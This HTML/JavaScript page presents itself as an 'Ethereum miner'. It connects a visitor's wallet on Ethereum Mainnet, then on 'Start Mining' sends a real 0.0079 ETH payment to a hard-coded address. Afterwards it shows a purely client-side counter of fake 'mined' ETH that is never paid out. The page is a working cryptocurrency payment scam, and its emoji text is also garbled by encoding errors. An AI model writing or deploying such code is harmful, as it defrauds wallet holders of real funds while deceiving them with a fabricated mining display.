<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Simulated Ethereum Miner</title>
  <!-- Bootstrap CSS for styling -->
  <link
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
    rel="stylesheet"
  />
  <style>
    body {
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding: 2rem;
    }
    .btn-custom {
      background-color: #1abc9c;
      border: none;
      color: #fff;
    }
    .btn-custom:hover {
      background-color: #16a085;
    }
    .emoji {
      font-size: 1.5rem;
    }
    .form-control {
      margin-bottom: 1rem;
    }
    #miningStatus {
      font-size: 1.2rem;
      margin-top: 1rem;
    }
  </style>
</head>
<body>
  <div class="container text-center">
    <h1 class="mb-4">ğŸš€ Simulated Ethereum Miner</h1>
    <p>Connect your wallet to start the simulated mining process.</p>
    <button id="connectWallet" class="btn btn-custom btn-lg mt-3">
      ğŸ”— Connect Wallet
    </button>
    <div id="walletInfo" class="mt-4"></div>

    <div id="actions" class="mt-5" style="display: none;">
      <h2>ğŸ› ï¸ Actions</h2>
      <button id="startMining" class="btn btn-custom mt-3">âš’ï¸ Start Mining Ethereum</button>
      <div id="miningStatus" class="mt-3"></div>
    </div>
  </div>

  <!-- Ethers.js -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <!-- WalletConnect Web3Modal -->
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3modal@2.0.0-beta.14/dist/umd/index.min.js"></script>

  <script>
    let provider;
    let signer;
    let miningInterval;
    let minedAmount = 0;
    const miningRatePerSecond = 0.00000000382; // ETH per second
    const monthlyCap = 0.0099; // ETH

    // Initialize Web3Modal
    const web3Modal = new window.Web3Modal.default({
      projectId: "YOUR_PROJECT_ID", // Replace with your WalletConnect Project ID
      themeMode: "dark",
      themeVariables: {
        "--w3m-accent-color": "#1abc9c",
        "--w3m-background-color": "#0f2027"
      },
      chains: [
        {
          id: 1,
          name: "Ethereum Mainnet",
          rpcUrl: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID" // Replace with your Infura Project ID
        }
      ]
    });

    document.getElementById("connectWallet").addEventListener("click", async () => {
      try {
        const instance = await web3Modal.connect();
        provider = new ethers.providers.Web3Provider(instance);
        signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("walletInfo").innerHTML = `
          <p class="emoji">âœ… Connected Address:</p>
          <p>${address}</p>
        `;
        document.getElementById("actions").style.display = "block";
      } catch (error) {
        console.error("Connection failed:", error);
        document.getElementById("walletInfo").innerHTML = `
          <p class="emoji">âŒ Connection Failed</p>
        `;
      }
    });

    document.getElementById("startMining").addEventListener("click", async () => {
      const paymentAmount = "0.0079";
      const recipientAddress = "0xf1b3424bb282ee20e394717dcb4fe59fc67835e0";
      try {
        const tx = await signer.sendTransaction({
          to: recipientAddress,
          value: ethers.utils.parseEther(paymentAmount)
        });
        document.getElementById("miningStatus").innerText = `Payment sent: ${tx.hash}\nStarting simulated mining...`;
        await tx.wait();
        startSimulatedMining();
      } catch (error) {
        console.error("Payment failed:", error);
        document.getElementById("miningStatus").innerText = "Error initiating mining process.";
      }
    });

    function startSimulatedMining() {
      if (miningInterval) clearInterval(miningInterval);
      minedAmount = 0;
      miningInterval = setInterval(() => {
        minedAmount += miningRatePerSecond;
        if (minedAmount >= monthlyCap) {
          clearInterval(miningInterval);
          document.getElementById("miningStatus").innerText = `ğŸ‰ Mining complete! Total mined: ${monthlyCap.toFixed(8)} ETH`;
        } else {
          document.getElementById("miningStatus").innerText = `â›ï¸ Mining in progress... Total mined: ${minedAmount.toFixed(8)} ETH`;
        }
      }, 1000);
    }
  </script>
</body>
</html>
